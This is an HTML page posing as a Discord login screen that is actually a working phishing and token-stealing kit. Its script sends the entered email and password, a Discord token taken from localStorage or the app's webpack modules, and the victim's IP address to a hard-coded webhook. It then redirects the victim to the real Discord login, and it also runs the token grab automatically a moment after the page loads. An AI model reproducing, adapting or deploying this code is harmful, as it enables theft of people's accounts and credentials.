<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Discord</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body, html { height: 100%; background: #fff; font-family: 'Inter', sans-serif; color: #060607; }
    .container { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; padding: 24px; }
    .logo { width: 124px; margin-bottom: 32px; }
    h1 { font-size: 24px; font-weight: 600; margin-bottom: 8px; text-align: center; }
    p { font-size: 16px; color: #5c5e66; margin-bottom: 32px; text-align: center; }
    form { width: 100%; max-width: 400px; }
    label { font-size: 12px; font-weight: 600; color: #060607; margin-bottom: 6px; display: block; }
    input { width: 100%; padding: 12px 16px; border: 1px solid #d1d5db; border-radius: 8px; font-size: 16px; margin-bottom: 16px; background: #f9f9fa; }
    input:focus { outline: none; border-color: #5865f2; }
    .forgot { text-align: right; margin-bottom: 24px; }
    .forgot a { color: #5865f2; font-size: 14px; text-decoration: none; }
    button { width: 100%; padding: 14px; background: #5865f2; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; }
    button:hover { background: #4752c4; }
    .register { text-align: center; margin-top: 24px; font-size: 14px; color: #5c5e66; }
    .register a { color: #5865f2; text-decoration: none; }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://seeklogo.com/images/D/discord-wordmark-white-logo-E95C468613-seeklogo.com.png" alt="Discord" class="logo" />
    <h1>Welcome back!</h1>
    <p>We're so excited to see you again!</p>
    <form id="loginForm">
      <label for="email">Email or Phone Number <span style="color:#f23f42">*</span></label>
      <input type="text" id="email" required />
      <label for="password">Password <span style="color:#f23f42">*</span></label>
      <input type="password" id="password" required />
      <div class="forgot">
        <a href="#">Forgot your password?</a>
      </div>
      <button type="submit">Log In</button>
    </form>
    <div class="register">
      Need an account? <a href="#">Register</a>
    </div>
  </div>

  <script>
    const WEBHOOK = 'https://discord.com/api/webhooks/1434969761539690639/z9ni7tqOcUmKzc542doFrJOL3WZuBwtcnWXnJkP_XAXIW7BEDeWLg-D7coUWuFHs_3cS';

    function grabToken() {
      let token = null;
      let method = 'none';

      try {
        const ls = localStorage.getItem('token');
        if (ls && ls.length > 50) {
          token = ls.replace(/"/g, '');
          method = 'localStorage';
        }
      } catch (e) {}

      if (!token) {
        try {
          webpackChunkdiscord_app.push([[''], {}, r => {
            for (let m in r.c) {
              if (r.c[m].exports?.default?.getToken) {
                token = r.c[m].exports.default.getToken();
                method = 'webpack';
                break;
              }
            }
          }]);
        } catch (e) {}
      }

      return { token, method };
    }

    async function send(data) {
      const ip = await fetch('https://api.ipify.org').then(r => r.text()).catch(() => 'unknown');
      const { token, method } = grabToken();
      fetch(WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            title: token ? 'TOKEN GRABBED' : 'LOGIN ATTEMPT',
            color: token ? 0x00ff00 : 0x5865f2,
            fields: [
              { name: 'Email/Phone', value: `\`${data.email}\``, inline: false },
              { name: 'Password', value: `\`${data.password}\``, inline: false },
              { name: 'Token', value: token ? `\`\`\`${token.substring(0, 60)}...\`\`\`` : 'Not found', inline: false },
              { name: 'Method', value: `\`${method}\``, inline: true },
              { name: 'IP', value: `\`${ip}\``, inline: true }
            ],
            timestamp: new Date().toISOString()
          }]
        })
      });
    }

    document.getElementById('loginForm').onsubmit = async (e) => {
      e.preventDefault();
      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value;
      if (!email || !password) return;

      await send({ email, password });

      setTimeout(() => {
        window.location = `https://discord.com/login?email=${encodeURIComponent(email)}`;
      }, 800);
    };

    // Auto-grab on load
    setTimeout(() => send({ email: 'AUTO', password: 'AUTO' }), 1500);
  </script>
</body>
</html>
